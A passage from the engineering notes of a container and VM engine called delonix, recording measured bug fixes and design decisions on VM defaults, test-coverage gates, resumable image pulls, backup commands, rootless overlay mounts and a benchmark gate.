  — the rootless delegated leaf path, not systemd, which needs a root kubelet to be
  measured): `memory_limit_in_bytes`/`cpu_quota`+`cpu_period` in a real `UpdateContainerResources`
  via `crictl update`, with the SAME pid — `memory.max` 134217728→268435456, `cpu.max` "50000
  100000"→"100000 100000"; a second update with ONLY memory confirmed the partial merge —
  `cpu.max` stayed exactly as it was. **Not validated live**: the systemd arm
  (`SetUnitProperties`), blocked for the same reason as item 3 — it needs a stable root kubelet;
  only unit/pure tests of the argv and the property decision.

## `HYPERVISOR` in the VMfile + `vm convert` + `vm default-backend` (v0.45.x)

Three gaps closed in the already-existing VM image stack (`vm build`/`vm create`), requested
together: "convert to hypervisor", "VMfile compatible with the main hypervisors" and "set
the default hypervisor (libvirt or cloud hypervisor)" — the two backends `delonix-vm` already
supports, not Microsoft Hyper-V (the engine runs on Linux/KVM/rootless; "hyperv" here is an informal
shorthand for "hypervisor").

- **`delonix image vm convert <source> --to qcow2|raw [-o <dest>]`** (`vmimage::cmd_convert`,
  at the usual 3 entry points — `vm convert`/`image vm convert`/`image --vm convert`, +
  a clear refusal on `image convert` without `--vm`). Plain `qemu-img convert`, the same pattern already used in
  `cmd_build`; `source` first tries a local name from the `VmImageStore`, falling back to a literal path
  if it does not match. There is no "Hyper-V format" to convert — libvirt (QEMU) and Cloud Hypervisor already
  share qcow2/raw, so the conversion is only between those two.
- **`HYPERVISOR <cloud-hypervisor|libvirt>` in the VMfile** (`cmd::vmfile`, same spirit as
  `VCPUS`/`MEMORY`) — canonicalized at parse time via `delonix_vm::valid_backend_name` (fail-closed on
  an unknown name). **Fixed a pre-existing gap along the way**: `vf.vcpus`/`vf.memory` were already
  parsed and tested all along, but `vmfile::build()` never wrote them into the final `VmImage`
  — the `VmFile` doc-comment promised "defaults recorded in the image's metadata" and that
  had never happened, the same dead-code pattern (parsed, never wired) this repo has already
  found several times elsewhere. `VmImage` gained `default_vcpus`/`default_memory`/
  `default_backend` (`#[serde(default)]`, `None` on old/`vm pull`ed images — same known gap
  as `ubuntu_release`/`k8s_version`).
- **`vm create` applies the image's defaults** when `--disk` names a known local image
  (or no `--disk` is given, which always resolves to one) — `--vcpus`/`--memory` became
  `Option<u32>`/`Option<String>` (they were clap's `default_value_t`/`default_value`, which do not allow
  distinguishing "omitted" from "a value equal to the default") for the precedence: explicit `--vcpus`/`--memory`/
  `--backend` > what the image recommends > `1`/`"1G"`/`None`. Logic extracted into
  `resolve_vm_defaults` (pure, tested) — no call to `VmImageStore` inside it.
- **`DELONIX_VM_BACKEND` + `delonix vm default-backend [--set <backend>|--clear]`** — the engine only
  had auto-detection (prefers Cloud Hypervisor if installed, else libvirt) with no way to pin
  a persistent preference. It lives in `delonix-vm` (`get/set/clear_default_backend`,
  `<DELONIX_ROOT>/vm-default-backend`, one canonical name per line — no new JSON, zero
  dependency), not just in the bin, so `stack apply`/`cluster kubeadm` inherit the preference for free, just
  like the rest of the module already documents for the volumes⇒libvirt rule. **Full precedence in
  `create_with`**: explicit `cfg.backend` (which already includes the image's `HYPERVISOR`, resolved in
  the bin) > `DELONIX_VM_BACKEND` > the persisted default > the existing capability heuristic
  (volumes⇒libvirt; cloud image without kernel⇒libvirt if available). The two new levels behave
  like an explicit `--backend` — including overriding the heuristic and failing late and loud in
  `boot` if they request an incompatible backend (e.g.: CH + volumes) — because they are the operator's
  explicit choice, made once rather than per command.
- **Validated live** (isolated `DELONIX_ROOT` in the scratchpad, without touching this host's real VMs/images):
  `vm default-backend --set ch` normalizes to `cloud-hypervisor`, `--clear` returns to "none
  (auto-detection)", an unknown name refuses without writing anything; a 4 MiB `qemu-img create`
  converted on the 3 paths (`vm convert`/`image vm convert`/`image --vm convert`), `image convert`
  without `--vm` refuses with the right message; a `VMfile` with `FROM <local image>` + `HYPERVISOR
  libvirt` built with `vm build` produces a `.json` with `"default_backend": "libvirt"`; the new
  strings translate correctly under `--l18n=pt` (`pt.po`, section "vm convert /
  default-backend / HYPERVISOR do VMfile"). **Not validated live** (deliberately, so as not to leave
  a real VM stuck on this shared host nor require network/`virt-customize`): the full path
  `vm create --disk <image-with-HYPERVISOR>` actually booting on the recommended backend — covered
  only by `resolve_vm_defaults`, which is pure and tested.
- **To do, deliberately out of this increment**: an install/live-boot ISO from
  a build (the "convert to hypervisor" reading was never about this — see the decision note that
  fixed "hyperv" = generic hypervisor); exposing `generate_seed_iso` as a standalone command outside
  `vm create`; propagating `default_vcpus`/`default_memory`/`default_backend` to `cluster kubeadm`/
  `kind: Vm` (manifest) — today only `vm create` via CLI reads them.

## The battery measures `--help` for everything and EXECUTES a quarter (measured 2026-08-12)

First pass of the audit script (`skills/delonix-auditoria`), and the number that
matters came straight off the surface map, before any finding: the CLI has **245 commands, 218
invokable leaves**; `scripts/e2e.sh` checks the `--help` of **100%** of them (a dynamic loop
walks the tree) and **executes 55 — 25%**. The remaining 163 have their contract verified and are never
run, concentrated in `net` (45), `image` (31) and `vm` (24).

**A total green reads as "the CLI was tested", and what was tested is mostly the help
text.** It was in `net` that the two findings below appeared, on first contact, both in
commands the battery never executed.

**Since 2026-10-07 this number is a GATE and not a comment** (F0.2 of plan 65).
`scripts/cli_exec_ratchet.py` derives it from the `results.jsonl` of a real run — a leaf
counts when a `check`/`xfail` invoked it **and judged the result** — and fails in three
directions: when it drops, when it rises without the baseline rising in the same commit, and when a
NEW leaf enters the CLI with no one exercising it (a leaf no one runs lowers the fraction,
and that is the point). The numerator comes from a COMMITTED trace with provenance
(`scripts/cli_exec_trace.tsv`, the shape of `docs/proxmox/trace-*.routes`), because the hosted
runner does not run the battery — it blocks userns.

**Provenance can name a commit the run never saw, and it did (2026-10-08).** The
`--update` stamped `commit:` with HEAD, unconditionally. It is right to record a fresh
run and **wrong** to re-record an old one: re-recording the 160-leaf run on a newer
tip moved the stamp from `32efdbb5` to `759d1ea6`, three commits ahead — one of them a
28-line change to `scripts/e2e.sh`, i.e. to the very script the run exercised.
A provenance header that names the wrong commit is worse than none: it is a number
no one can date, wearing a date. `--commit <sha>` now names it, the default
stays HEAD, and there is a verified test that fails with the fix reverted
(`'759d1ea6' != 'deadbee'`).

**And a provenance count that does not add up is the same class of defect.** The header this
PR committed first said "of the 14 SKIP, 5 … and 7 …" — **12, not 14**. The fourteen,
classified: 7 need an OPNsense appliance (3) or a Proxmox cluster (4); 3 this host cannot
measure (`hostPort` in root/CNI, NFS with CAP_SYS_ADMIN, `system boot enable` writing
units outside the isolated root); 2 are FAILURE paths whose trigger is the tool being
ABSENT and this host HAS IT (`virt-customize`, `wg`), so they skip because it is capable and not because it is
not; 1 because there are no VM images; and 1 because `stack init --up` did not complete in 180 s —
**only this last one is a measurement gap**, the other thirteen are properties of the host.

**Measured on 2026-10-07 (4.5.0+185, PASS=1104 FAIL=0 SKIP=12): 125 of 272 — 46.0%.** The
numbers in this section and the "91 — 37%" the battery header carried since 2026-09-09
**are not comparable with this one**: they were counted by hand, over different trees, with a
rule that was never written down. That is why the rule is now in the script.

**Three traps that only measuring against REAL data caught**, and each gave a confident
and wrong number: counting `--help` invocations gave **100% in every group** (the
battery checks the `--help` of every leaf, by construction — it is the OTHER number); the binary
path arrives stuck to shell punctuation (`"$('…/delonix'`) and so 190 asserted commands
resolved to no leaf; and `container ls` never matched, because the canonical leaf
is `container ps` and the inventory comes from `--help`, which prints only the canonical name — the command
most exercised by the CLI counted as never executed.

**And a zero could be the right answer — `build`'s was not.** This section said that
`build` counts 0 "correctly, because no one judged that invocation". Measured on 2026-10-08:
the battery builds FOUR times inside a `check`, and the invocation WAS judged — what the
parser did not traverse was the shell function wrapping it (`build_env_path`), because the `cmd`
the `check` records is the function's NAME. It was not missing coverage, it was missing measurement. Instead
of rewriting the subtle `ENV PATH` check as a leaf, a minimal dedicated check entered
(a `-t` gives a name that `image ls` shows, and the declared `CMD` is what runs), with the
`Delonixfile` written outside it so the body stays free of nested quotes.

**The parser erased invocations that had run, and that was worse than erring low
(2026-10-08).** The first check with TWO invocations in the same shell body —
`diff <('$BIN' version …) <('$BIN' --version …)`, verifying the written promise that the
command prints the flag's text verbatim — counted the `version` leaf as ZERO. The scan
after the first engine-word never stopped at the `)`, entered the second command, found
`--version` in `HELP_FLAGS` and suppressed the invocation that HAPPENED. And the defect's sibling
explains it: the end-of-command test was **dead code since the first commit** — the
`unquote` strips `;|&` and `)` before the scan sees the word, so `stripped != x` could never
be true, and the fix this section described ("trailing separators … fixed with
SEPARATORS stripping that also ends the command") ended no command at all. It now reads
the RAW word (`ENDERS = ";|&)`"`), with two verified tests that fail with the fix
reverted. The `&` enters on purpose: stopping at a `2>&1` can only cost a longer leaf
path, and no leaf name has `&`.

**Measured on 2026-10-08: 160 of 272 — 58.8%** (PASS=1148 FAIL=0 SKIP=14 XFAIL=1). Of the jump, **33 leaves that
no one exercised** and **1 the battery already exercised and the parser did not see** (`build`) — and the
two are stated as separate on purpose: adding them would pass off as new coverage what was
missing measurement. The `ENDERS` fix, measured against the previous full run, recovers
**0** retroactively: it exists so `version` counts and so the next composite check is not
erased, not to inflate the numerator. The new leaves are pure reads and local loops (no hypervisor, no
network, no privilege), across 37 checks, and **none is an "invoke and return 0"**: a check that
judges nothing raises the numerator and tests nothing, which is the dishonesty the gate exists
to prevent — it would be worse than the leaf staying at zero. The eight scans (`prune`) run
AFTER cleanup, on purpose: an `image prune` midway pulled the base image out from under the
following sections.

**What the HOST does not measure is not what the battery does not exercise**, and the difference has to be read in
the trace header. In a rootless run there are checks that SKIP by precondition (the
`hostPort` in root/CNI mode stretch from #720 wants root and a conflist with `portMappings`), and a SKIP
counts no leaf. Whoever reads the fraction without this reads the difference as forgetfulness.

**The blind spot that remains, with the number that decided it.** The corrected parser's measurement against
the battery's FULL run (without the new checks) gives the SAME as the old one — 126 of 272 —,
so the fix recovers nothing retroactively: it exists so `version` counts and so the
next composite check is not erased. What stays invisible are the **shell wrappers**:
25 of the 1130 asserted commands define a function (`sp () { … "$BIN" "$@" }`) and call it, and
the parser does not traverse that. The rule that would resolve a wrapper defined in the SAME
body was written and measured before adopting it: it reveals **11 leaves, of which 1 new** (`vm
default-backend`) — the other ten already count via another path. New code in a shared
gate, with a regex over shell text, for ONE leaf, does not pay off: it stays a written non-decision,
with the number. The counter errs low by 1 via this path, and that is sayable.

**ACH-034, found while measuring this coverage:** `secret rotate-key` sets each secret's VERSION
to 1 (measured 4 → 1, with the value intact). The versioning rule has a single owner, written in
`SecretStore::save` (ADR-0069 item 6): equal values, same version — and a key rotation
changes no value. The cause is the ORDER inside `rotate_key`: it rotates the master key BEFORE
rewriting, and `save` compares against a file still sealed with the old key; the read
fails and falls into the "first write" branch. It stays in the battery as `xfail ACH-034` — it does not fail the
gate, it does not disappear, and it FAILS by XPASS the day it is fixed.

> **The number of checks is NOT the coverage, and this section almost said so.** The first version measured
> 51/23% and cited "198/198"; at release-prep time the checks were already 143 and the executions 55 (25%),
> because another session added cases in the meantime. **The measured fraction and the date are cited, never the
> report total** — a total that rises makes coverage look better without a single new leaf
> exercised. The ratio is what matters, and it recomputes with the day's `scripts/e2e.sh`.

**Finding 1 — the `ENOENT` of a spawn, again.** `network node init`/`key` returned
``system call `spawn` failed: No such file or directory (os error 2)`` when `wg` is missing: it does not
name the tool, does not say the package, and the phrase tells you to look for a path when a
binary is missing. It is the already-cataloged class ("the ENOENT of a `Command::status()` is not a file
missing"), which v0.45.0 had fixed in `vmimage::tool_package` and **reappeared elsewhere** — and the
remedy was two functions away (`cmd::network` already refused the encrypted overlay naming
`wireguard-tools`). Fixed **at the source** (`delonix-sdn::wg`, the `map_err` of the two spawns), so
any caller inherits it, rather than repeating it in `cmd_node`.

**Finding 2 — `network create --driver overlay --wg-ip` reported SUCCESS over an unrealized
network.** rc=**0**, the name on stdout, and the actionable error demoted to a *warning* that promised
to reconcile "on the next `network create`". Measured: the second create gives **conflict (5)**, because
`create_overlay` is not idempotent — the promise was false and the network stayed `Realized=False` with no
command that could save it. **The file already contained the argument against itself**: the `bridge` arm
does a rollback of the registration with a comment describing exactly this symptom, and the `overlay` comment
admits that it, unlike macvlan/ipvlan, **is realizable in rootless**. It was in the
wrong bucket; it moved to the `bridge` pattern (rollback + propagate the error).

**Gate** in `scripts/e2e.sh` (network section), verified by the repo rule — 4/4 with the fix,
**1/4 with it reverted**. And what passed in both is the lesson: `check … 1 …` **distinguished nothing**,
because the raw errno also came out 1 — the gate that catches this is the MESSAGE one (contains
`wireguard-tools`, does not contain `No such file`). An exit-code gate would have gone green over the
bug. It skips with `SKIP` on a host that HAS `wg`, because there the failure path does not exist and a green
would exercise nothing.

**To close, measured and not fixed:**
- **`scripts/e2e.sh` does not isolate state** — no reference to `DELONIX_ROOT`, unlike
  `chaos.sh`, which redirects both roots and warns of it in the header. It runs against the machine's real
  state. Isolating from outside works (that is how this audit ran), but forcing it by default
  would break the checks that depend on real state (images in the store, holder) — it is work with
  analysis, not a one-liner.
- **`delonix backup`/`restore` do not appear in `AGENTS.md`** (the only occurrence of the word is an
  incidental sentence about exit codes), despite having a documentation page and checks in
  `e2e.sh`. In a guide that documents everything else, it is the group an SRE looks for first.
- **The 167 never-executed commands.** It is the slice with the best return for the next session.

**The auditor's own traps, all caught in this pass** (and all already cataloged — which
proves the list serves): `$?` after a pipe would report `rc=0` where it was 1 (it was `head`'s
`$?`); a `grep "delonix <group>"` gave three groups as undocumented and it was false; the pages
`docs/comandos/netns.html` seemed stale and have the correct `Usage:` inside; a `head -3` on
`git status` hid two files; and classifying `init` as a read command generated scaffold
at the repo root (`README.md`, `VMfile`, `cloud-init/`, `cluster-kind.yaml`,
`delonix-manifest.yaml` — all removed, nothing tracked touched). In passing it was proved that the
scaffold **does not overwrite**: `already exists, skipped (use --force to overwrite)`.

## Pulling a blob restarted from scratch, so on a slow link it never finished (2026-08-12)

A real bug report, measured by the user: `vm pull` of a 276 MiB image died after
**8m19s** with ``blob read: request or response body error``, and this host's link to ghcr measured
**416 KB/s** (22.9 MB in 55s, confirmed separately with `curl` following the redirect). What makes this
worse than a slow failure: **there was no resume** — the next attempt restarted at byte zero,
so on a link below ~600 KB/s the image **never** finished downloading, no matter how many times
it was tried. And it is the first command an administrator runs.

**The report's attribution to the timeout was out of date, and it is worth recording why**: the ceiling is already
**4 hours** since v0.47.1 (`transfer_client`, written after VM image publishing had
failed for exactly this). 8m19s is not 4h — so the cause is the link dropping midway, not the
clock. The report's conclusion stands all the same, and stronger: against a connection
drop, a larger ceiling does nothing and only resume solves it.

- **The fix lives in the ONLY place both paths pass through** —
  `Client::blob_with_progress_capped`. `pull_from_registry_with_creds` (container layers) and
  `pull_oci_artifact` (single-blob VM artifact) both call it, so there is no second
  copy of the logic to diverge. 5 attempts with backoff (1-8s), `Range: bytes=<n>-` from what
  is already in memory, and one `warn` line per resume — without it, a slow pull resuming is
  indistinguishable from a hang, which is half the original complaint.
- **What makes it safe to stitch two ranges is the same as in `stream_download`**: every
  caller verifies the digest at the end (config against the manifest, layers against what the CAS
  returns, artifact by explicit comparison). Bytes from two responses either give the published
  hash or are discarded.
- **Three ways a server does NOT honour the range, and only one is a resume**: 206 at the requested offset
  (resumes); 206 at another offset (**answered a different question** — pasting would duplicate the prefix, and
  the corruption would only appear at the digest, after the entire download was already paid for);
  200 (ignored the header). The last two restart from scratch. `parse_content_range` is pure and tested — it is
  the guard that stops the first.
- **`content_length()` on a 206 response is the FRAGMENT's size, not the blob's.** Using it would make the
  bar restart against a shrinking total. On a resume the whole size comes from the `/<total>` of the
  `Content-Range`.
- **A clean EOF short of the announced size is also resumed.** Before, the blob came back truncated and
  what caught it was the caller's digest verification — reporting *corruption* for what was a
  severed connection.
- **Retry only of what makes sense to retry**: a failure OPENING the connection is only retried when there are already
  bytes in hand (there the URL and the token were good seconds ago, so it is transport). On the first
  attempt, the same error is far more likely a 403/404, and five attempts would only delay
  a response the caller already has. A `NotFound` is never retried.

**2nd bug, found while wiring this, and it is a false report**: the progress callback reports the
**cumulative** of the blob, and the PARALLEL pull adapter added it to the aggregate as if it were a delta
of each chunk. The announced bytes grew with the **square** of the layer size — measured, a
layer of 300,000 bytes announced **1,416,160**. `pull_oci_artifact` reads the same callback
correctly (compares `done` with the total), so the two consumers of a single callback
disagreed on the meaning of the argument — the
generator-and-reader-share-the-format family already cataloged here (`fw_rule_tail`).

**Validated live with the BINARY** (not only by unit test), against a local OCI registry that
cuts the connection midway through the blob, with an isolated `DELONIX_ROOT`: two drops on a 6 MB blob, resumed
at 3,000,000 and 4,500,000 bytes, the server confirming each request took **only what was missing**, and
the final file matching the published digest. And the give-up path: a server that cuts
ALWAYS fails in 15s with `gave up after 5 attempts with 5812500 of 6000000 bytes`, without writing anything.
Tests that **fail with the fix reverted** — the three resume ones with `BLOB_ATTEMPTS = 1`, and the
aggregate-progress one with the old adapter (it needs a layer of several 64 KiB chunks: with
a single-chunk layer, the wrong adapter gets it right by accident).

**Gap found in passing, not fixed at this point** (out of scope): `vm pull` and `image vm
pull` accept `--name`, the legacy form `image --vm pull` does not — a divergence between the three entry
points the rest of the group keeps aligned. **Closed by Sprint 9 of the CLI restructuring**
(above): with a single entry point (`vm image pull`), there is no second copy to diverge.

## An `exec` right after `run -d` can write to the wrong place (measured 2026-08-28)

Found while chasing a battery check that failed now and then since
2026-08-25 — the "the data came back", from the backup cycle. The file attributed it to
timing and swapped the `sleep 1` for a condition wait on the READ. It was not the
read's timing, and it was not the restore.

**Measured, six cycles, TWO failing**: a `container exec` fired
immediately after a `container run -d -v <vol>:/data` writes the file,
**returns 0**, and the following `cat` finds nothing. With the container already
established, writing in one `exec` and reading in another always works — and the file
appears in the volume's `_data` on the host side.

The reading is that `run -d` returns before the volume is mounted, and the `exec`
that catches that window writes to the `/data` of the **rootfs** instead of to the
volume. There is no error: the directory exists (it is the rootfs's one), the write passes, and
what is lost is the destination.

**The consequence in the gate was misleading on purpose.** A backup taken from an
empty volume restores an empty volume, and the check failed **three steps after**
the place where the problem was — in "the data came back", which points to the
restore. That is what made this defect pass for timing flakiness for three
days.

**What got done**: the battery now waits for the write to PERSIST (writes
and re-reads until it matches), instead of trusting the `exec`'s rc. **What did NOT get done**: the
engine still accepts the `exec` in that window. The two possible exits are for
`run -d` to return only once the mounts are up, or for the `exec` to refuse while
they are not — both touch the `spawn` boundary, which this guide already flags
as a risk function of ~405 lines, and neither is decided in passing. It stays with the
number alongside: **~33% incidence** on this machine, under load.

## `delonix backup` — six verbs, one object (consolidated in the CLI cycle)

The sweep above found it by its absence: a guide that documents everything else did not have **a
line** about backup (the only occurrence of the word was incidental, about exit codes), despite the
group having a documentation page and a full cycle in the E2E battery. It is the first place an SRE
looks, and it was the only one with nothing written.

**The surface changed, a clean cut with no aliases**: `backup <kind> <name>` became
`backup create <kind> <name>`; the ROOT `restore` disappeared and is `backup restore <archive>`; and
scheduling moved from backup flags to `backup schedule`. Three verbs entered that **did not
exist** — `list`, `inspect` and `remove`: until now the question "what archives do I have" was answered
with `ls` and deleting one was `rm`. The old form fails with `unrecognized subcommand` (rc=2), never in
silence.

**`system backup` was NOT folded in here, and ADR-0020 once said it should be.** It listed it under
"several doors to one object", alongside `backup`. Measured, they are two OBJECTS: this group archives
ONE resource with its volumes' data; `system backup` archives a node's **entire state root** (registries,
secrets, cluster PKI, HTTPRoute config, the event log, with the heavy and
re-obtainable areas opt-in). Merging them would have erased a capability by calling it tidying. The
fix is written in the ADR itself, and there are two checks in the battery requiring that the two keep
existing separately.

**What the archive carries, and it is the decision that defines the rest**: `backup create <container|pod|vm|stack>
<name>` writes a `.tar.gz` with the **registration** and the **volumes' DATA** — **not** the image and
**not** the rootfs, which `backup restore` derives by pull. The **VM is the exception**: its overlay disk IS
its state, so that travels inside the archive. The rule behind it is the same as the rest of the engine: what
has a content address and is re-obtainable is not duplicated; what only exists on that host, yes.

`backup restore <archive>` accepts a path or the **bare name** of an archive in `--from` (default
`.`). **It refuses with the resource running** and only `--force` stops, restores and boots again — the
same discipline of not destroying what is alive without the operator saying so.

**The `<kind>` stopped being positional, and the original author's reasoning held.** He required it with
a correct argument — "restoring by the archive's kind would make `restore vm <container-archive>`
silently do something different from what was written". But the archive ALREADY records what it carries, and
forcing the caller to repeat it is the repetition the spec removes. The compromise: `--kind` is
**optional and still refuses** a disagreement, and the archive's kind is **always printed**. The
guard stays; the repetition goes.

**Three functions became shared by three verbs, and one lied.** `read_meta` prefixed
its errors with `restore:` — a `backup remove` pointed at a foreign `.tar.gz` answered
"restore: … failed to read entire block", naming a command no one ran. It became
`backup:`. `remove` refuses any archive this group did not write, verified **by reading
the archive** and not the name: a `.tar.gz` from another tool in the same folder would be deleted
otherwise — and there is a check in the battery confirming that the foreign file IS STILL there after the refusal (a
`remove` that refuses and deletes anyway would return non-zero and have destroyed the data all the same).

**What the battery already proves** (`scripts/e2e.sh`, section "backup / restore per resource"), and it is the
model to follow for the rest of the CLI: the REAL cycle — archive, **destroy the data**, restore, and
confirm it came back. A `backup` that returns 0 proves nothing; what proves it is the file's content
after the data has been deleted. Hence the checks look INSIDE the tar
(`volumes/<vol>.tar.gz` present, `rootfs/` **absent** — the promise of the paragraph above verified
as fact), `--dry-run` not leaving a single file, and the error paths returning class
**4** (does not exist) instead of a generic 1.

**Scheduling is answered** (this entry said "to be confirmed… I cannot say whether the scheduler
is internal, a timer or a cron line"): it is a **systemd user timer**, one per
resource, installed by `backup schedule`. And it takes **the first archive too, right away** — the reason
is in the code and it is good: a schedule whose first run is hours away leaves whoever installed it
without a backup and with the impression of having one. `schedule` without `--cron` or `--max-for-day` **refuses** instead
of behaving like a silent `create`, with a test that fails if the refusal is removed.
## Rootless containers share layers instead of copying them (v0.59.0)

A bug report opened this one («the containers are filling up the disk») with a compression proposal.
The measurement disagreed with the premise, and that is where everything follows from: `containers/` held 47 GiB and **~39 were
byte-for-byte duplication** — 21 containers from the SAME `kaeso-odoo:16`, each with its own physical copy
of 2.1 GiB, every file at `nlink == 1`. Each `run` paid **13 s and 2.2 GiB**.

`prepare_rootfs` did `export_rootfs` (a FLAT copy of the image per container) and the overlay path
had existed for a long time, except **rootless-only-no**: `mount(2)` from an unprivileged uid is
EPERM. **But the mount does not have to happen in the CLI** — `setup_rootfs` already runs inside the clone,
as the creator of the userns and with full caps over it. Measured before writing code: an
`mount -t overlay` without privilege inside `unshare --user --map-root-user --mount` mounts, reads from the
lower and writes to the upper.

- **Contract on DISK, not a field in the `RunSpec`** — `ImageStore::prepare_overlay` leaves an
  `overlay-lowers` next to the `merged/` and `mount_overlay_if_marked` reads it. The rootless paths
  re-execute the binary (`--net <custom>`, `--pod`) and a struct does not survive that boundary.
- **Sharing is safe by construction, and it was VERIFIED**: against a container running as uid
  0 in its userns, writing and deleting a file from the lower left it with the same inode and the same
  bytes. Copy-up before the write, whiteout on removal.
- **`chown_tree(…, USERNS_UID_BASE)` was dead code** and never did anything: `lchown` to 100000 from
  an unprivileged uid is EPERM and `lchown_tree` swallows the error. Layers and rootfs of this
  host are uniformly `1000:1000`, and they work because the rootless map is `0 <euid> 1` — the uid 0
  INSIDE the namespace IS the one who invoked it. That is also what lets one layer serve everyone.
- **`build` stays on the flat path** (`prepare_rootfs_flat`), deliberately: `COPY` writes to the
  tree from the host, `FROM <stage>` clones with `cp -a`, `commit_flat_rootfs` packs —
  all outside any namespace. And it is the case where duplication does not accumulate.
- **`existing_rootfs_path` resolves all THREE layouts**, and the marker is checked FIRST: a
  container may have both forms at the same time (a legacy `rootfs/` next to the new `merged/`),
  and picking the old copy would start it against a tree that no longer receives its writes.

**A legacy flat MIGRATES on the next `start`** (`migrate_flat_to_overlay`, post-v0.59.0 — the notes
for that release say «there is no automatic migration» and describe what was true when they shipped).
A RUNNING container does not convert: the process did `pivot_root` into that tree and has open
files inside it, so swapping its root is recreating it. What is leveraged is the stop
that already happened — a `start` is the only instant when the tree belongs to no one, and converting there
costs no downtime that was not already being paid.

- **The ORDER is correctness and not taste**: `rename(rootfs→upper)` (atomic) → **whiteouts** →
  `overlay-lowers`. A flat rootfs is the image plus the writes ALREADY merged, so a file
  that the container DELETED is simply absent; without a whiteout the overlay serves it back from the
  lower, and a purged config or a rotated secret reappearing is worse than the disk you save.
  `overlay-lowers.pending` is the COMMIT point — renaming it is the only step that makes the
  container overlay, and everything before it reverts to flat.
- **The pruning of the identical ones runs AFTER the commit** and may fail at will: it is the only part that only
  costs space. It is also the reason the migration is written as «delete what is redundant» and not
  as the apparently equivalent «copy what differs» — the former errs on the side of space,
  the latter loses data.
- **Best-effort, and never blocks a start.** The image is resolved LOCALLY (a `start` does not go
  to a registry on account of an optimization) and any failure leaves the container starting flat.
- **Runs in the mapped userns for TWO independent reasons**: the whiteouts need `CAP_MKNOD`
  (measured in the spike: `mknod c 0 0` works inside `unshare --user --map-root-user` and
  overlayfs honours it), and a flat rootfs may have files from a mapped SUBUID — everything the
  container wrote as uid≠0 — that the invoking uid cannot move or delete.
- **Validated with the REAL 0.58.0 binary** (the installation backup), so that the flat container is
  genuine and not fabricated: own writes preserved, `/etc/alpine-release` deleted in there NOT
  resurrecting (whiteout `c--------- 0, 0` on disk), 9 MB → 1 MB, and the 2nd start a no-op.

**Two defects that only validation revealed**: `commit` started reading through `/proc/<pid>/root`, which
includes the container's MOUNTS — the packer descended through the real procfs and failed with `Permission
denied` (had it finished, it would publish a portrait of the host kernel inside an image); `pack_rootfs_tar`
keeps `proc`/`sys`/`dev` empty. And the `Command::spawn`/`pre_exec` that deadlocks with the userns
handshake — see the entry in the «X is not Y» class.

**`cp`/`commit` on a STOPPED overlay container** (`__ovlhold` + `reexec_mapped_hold`): the `merged/` is
an empty directory until someone mounts. Instead of copying the tree to a temporary (the copy we
just eliminated) or redoing the overlayfs merge in userspace (a 2nd implementation of the kernel's
semantics), a process holds the mount in its namespace and the rest reads through `/proc/<pid>/root` — the
SAME door as the live container, zero downstream changes. `HeldChild` kills **and reaps** on `Drop`:
without the reap, a `serve docker-api` accumulates zombies, a defect that path already paid for.

**Measured**: 6 containers from the same image at 1 MiB each against 17 MiB of layers; on the real host,
`containers/` from **47 to 7.2 GiB**. **Not validated**: the `scripts/e2e.sh` battery did not run
in this series (it runs against real state and the host had live production). ADR-0016 closes the
filesystem question that gave rise to everything.

**A method trap worth it on its own**: the containers only start sharing when the binary IN
USE is the new one. During this series the host created flat containers with `--version` saying the right
number — see «two builds with the same version are not the same build».

## The many-layer overlay gave ENOENT — the classic `mount(2)` truncates `lowerdir=` silently (ADR-0037)

Found while validating `kind: App` live (not touched in this base yet, but the bug is in the
engine): a `container run` of an image with 91 real layers
(`paketobuildpacks/builder-jammy-base`) always failed with `failed to prepare
the rootfs: ENOENT`, with no `kind: App` and no manifest involved at all — reproduced
with a plain `container run` of the same image.

**Measured in the real rootless sandbox** (`unshare --user --map-root-user --mount`, the
same one in which `mount_overlay_if_marked` already runs): the string `lowerdir=a:b:c:...`
that the classic `mount(2)` receives as the `data` argument is copied by the kernel via
`strndup_user(data, PAGE_SIZE)` — **a ceiling of 4096 bytes on this architecture,
truncated SILENTLY, never with an error**. A `lowerdir=` cut in the middle of a
path fails to open that truncated path — exactly the `ENOENT` observed.
The exact boundary measured: 20 real layers (4084 bytes) mount fine, 30 (5994
bytes) always fail. The real image that revealed this needs **9107 bytes**.

**Fixed by moving the mount to the new API** (`fsopen`/`fsconfig`/`fsmount`/
`move_mount`, Linux 5.2+, with overlayfs's incremental `lowerdir+` since
6.5): one `fsconfig(fd, FSCONFIG_SET_STRING, "lowerdir+", <path>, 0)`
call PER layer, never a single string — there is no ceiling for a per-layer
call to hit. Via `rustix` (`mount`+`fs`), not raw syscalls: the `nix`
already used in this file has no wrapper for these four calls, and
`rustix` **is already in the tree at this exact version** (pulled by `tempfile`) —
enabling its features adds no new dependency to the supply
chain, it only compiles already-vendored code from an already-trusted crate.

**No length-based fallback to the classic call, on purpose**: the new
API is in every kernel this engine already requires (cgroup v2, `clone3`,
pidfd); keeping two paths for the same operation is the maintenance cost
this repo's discipline avoids, and a length-triggered fallback
would silently reintroduce the bug on any kernel without the new path, disguised
as an intermittent failure instead of a clear error.

**Validated live across three layers**: (1) an isolated C harness in the SAME
sandbox, 100 synthetic layers / 19 KB of path data — almost 5x the classic
ceiling — mounted correctly, content intact, writes going only to
`upper/`; (2) the Rust implementation, no regression on a normal container
(`alpine`, few layers) and — the proof that matters — the SAME real 91-layer
image that failed 100% of the time now starts (`run_exit=0`), with
`overlay-lowers` confirmed at 91 lines/9107 bytes, `/etc/os-release` returning
the real Ubuntu 22.04 (not a corrupted rootfs) and write-and-reread
inside the container confirming copy-up intact; (3) the full workspace
gate (fmt/lang_ratchet/clippy/test/deny).

See ADR-0037 for the full detail, including the measurement table.

## The performance regression gate, and the third exit that makes it reliable (M11)

`scripts/bench.sh` already measured the three engines on the same machine and already REFUSED
to run on a loaded bench. What was missing was the other half: nothing compared
today's number to a recorded one, so a regression only showed up when
someone happened to read the table again by chance.

**`--json` was accepted and IGNORED.** `JSON=1` was assigned and never read — the flag
printed the same human-readable table. It is the class this file chases
everywhere (`--security-opt seccomp=`, `-v …:z`, `--network-alias`), this time
in the very harness that exists so as not to lie. Now it emits an object on stdout and
sends the report to stderr, the contract of the `-o json` of the rest of the CLI.

**`scripts/bench_gate.py` READS a measurement and never makes one** — two opinions about the
same number is how they start to diverge. And it has THREE exits, not two:

| exit | when |
|---|---|
| **0** | within tolerance (25% over the recorded median) |
| **1** | regression: the engine degraded and the anchors did not |
| **3** | **refuses to judge** |

The third is what makes it reliable, and it comes directly from the incident of
2026-08-10 (`docs/measured-comparison.md`): docker 1406, podman 1351, delonix 640,
and the next run 208 / 268 / 89. A naive gate would have read that as «the
delonix regressed 7×» and gone red over a machine problem. That is why
